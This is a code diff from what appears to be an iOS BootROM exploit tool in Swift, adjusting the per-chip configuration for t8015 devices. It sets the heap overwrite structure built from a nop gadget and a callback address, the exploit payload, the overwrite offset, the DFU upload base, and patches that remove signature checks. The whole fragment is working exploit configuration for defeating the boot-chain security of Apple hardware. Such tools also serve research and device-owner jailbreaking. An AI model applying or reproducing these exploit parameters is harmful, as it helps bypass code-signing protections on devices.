@@ -330,8 +330,10 @@ fileprivate func getDeviceConfigs() -> [PwnUSBDeviceConfig] {
     let t8011_rmsigchks = rmsigchks_patchesFor(device: 0x8011)
     let t8011_iStrap = iStrap_patchesFor(device: 0x8011)
 
-    let t8015_overwrite = struct_pack("<32x2Q16x32x2Q12xI", t8015_nop_gadget, 0x18001C020 as UInt64, t8015_nop_gadget, 0x18001C020 as UInt64, 0xbeefbeef as UInt64)
-    let t8011_payload = getDevicePayload(device: 0x8011)
+    let t8015_overwrite = struct_pack("<32x2Q", t8015_nop_gadget, 0x18001C020 as UInt64)
+    let t8015_payload = getDevicePayload(device: 0x8015)
+    let t8015_rmsigchks = rmsigchks_patchesFor(device: 0x8015)
+    let t8015_iStrap = iStrap_patchesFor(device: 0x8015)
     
     return [
         // s5l8960 - NOT SUPPORTED
@@ -341,10 +343,10 @@ fileprivate func getDeviceConfigs() -> [PwnUSBDeviceConfig] {
         PwnUSBDeviceConfig(version: "iBoot-2696.0.0.1.33", largeLeak: false, leak: 1, overwrite: t8010_overwrite, overwriteOffset: 0x5C0, hole: 5, payload: t8010_payload, dfuUploadBase: 0x1800B0000, rmsigchksPatches: t8010_rmsigchks, iStrapPatches: t8010_iStrap, iStrapDisableDFUFunc: 0x0),
         
         // t8011
-        PwnUSBDeviceConfig(version: "iBoot-3135.0.0.2.3", largeLeak: false, leak: 1, overwrite: t8011_overwrite, overwriteOffset: 0x540, hole: 6, payload: t8011_payload, dfuUploadBase: 0x1800B0000, rmsigchksPatches: t8011_rmsigchks, iStrapPatches: t8011_iStrap, iStrapDisableDFUFunc: 0x0)
+        PwnUSBDeviceConfig(version: "iBoot-3135.0.0.2.3", largeLeak: false, leak: 1, overwrite: t8011_overwrite, overwriteOffset: 0x540, hole: 6, payload: t8011_payload, dfuUploadBase: 0x1800B0000, rmsigchksPatches: t8011_rmsigchks, iStrapPatches: t8011_iStrap, iStrapDisableDFUFunc: 0x0),
 
         // t8015
-        PwnUSBDeviceConfig(version: "iBoot-3332.0.0.1.23", largeLeak: false, leak: 1, overwrite: t8015_overwrite, overwriteOffset: 0x5C0, hole: 6, payload: t8011_payload, dfuUploadBase: 0x1800B0000, rmsigchksPatches: t8011_rmsigchks, iStrapPatches: t8011_iStrap, iStrapDisableDFUFunc: 0x0)
+        PwnUSBDeviceConfig(version: "iBoot-3332.0.0.1.23", largeLeak: false, leak: 1, overwrite: t8015_overwrite, overwriteOffset: 0x540, hole: 6, payload: t8015_payload, dfuUploadBase: 0x18001C000, rmsigchksPatches: t8015_rmsigchks, iStrapPatches: t8015_iStrap, iStrapDisableDFUFunc: 0x0)
     ]
 }
 
